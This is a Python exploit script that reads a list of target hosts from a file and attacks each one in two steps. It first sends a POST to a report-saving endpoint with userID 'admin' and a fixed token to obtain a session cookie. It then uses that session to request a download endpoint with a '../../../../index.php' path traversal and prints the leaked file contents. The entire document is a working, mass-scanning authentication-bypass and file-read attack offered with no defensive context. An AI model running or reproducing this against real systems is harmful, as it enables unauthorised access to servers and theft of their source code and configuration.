import requests
import time

def get_hosts_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def send_post_request(url, data, headers):
    try:
        response = requests.post(url, data=data, headers=headers)
        phpsessid = None
        if 'Set-Cookie' in response.headers:
            cookies = response.headers['Set-Cookie']
            if 'PHPSESSID' in cookies:
                start = cookies.find('PHPSESSID=')
                end = cookies.find(';', start)
                phpsessid = cookies[start:end]
                print(phpsessid)
            else:
                print("PHPSESSID not found in Set-Cookie")
        else:
            print("Set-Cookie header not found in the response")
        return phpsessid
    except requests.ConnectionError as e:
        print(f"Connection error occurred: {e}")
    except requests.Timeout as e:
        print(f"Timeout error occurred: {e}")
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

def send_get_request_with_cookie(url, headers, cookie_value):
    headers['Cookie'] = cookie_value
    try:
        response = requests.get(url, headers=headers)
        print("当前HOST================================="+host)
        print(response.text)  # Print the response text to see the result
        return response
    except requests.ConnectionError as e:
        print(f"Connection error occurred: {e}")
    except requests.Timeout as e:
        print(f"Timeout error occurred: {e}")
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    hosts = get_hosts_from_file('url.txt')

    data = {
        'aa': 'xx',
        'userID': 'admin',
        'fondsid': '1',
        'comid': '1'
    }

    for host in hosts:
        post_url = f"http://{host}/Setting/Report/DesignReportSave.html?report=&token=java"

        post_headers = {
            'Host': host,
            'Accept-Encoding': 'gzip, deflate',
            'Origin': 'http://49.4.48.132',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Cookie': 'winWidth=1920; winHeight=455',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Content-Length': '66'
        }

        phpsessid = send_post_request(post_url, data, post_headers)

        if phpsessid:
            get_url = f"http://{host}/setting/ClassFy/exampleDownload.html?name=/../../../../index.php"
            get_headers = {
                'Host': host,
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
                'Connection': 'close'
            }

            send_get_request_with_cookie(get_url, get_headers, phpsessid)

        time.sleep(1)  # Pause between requests to avoid overwhelming the server
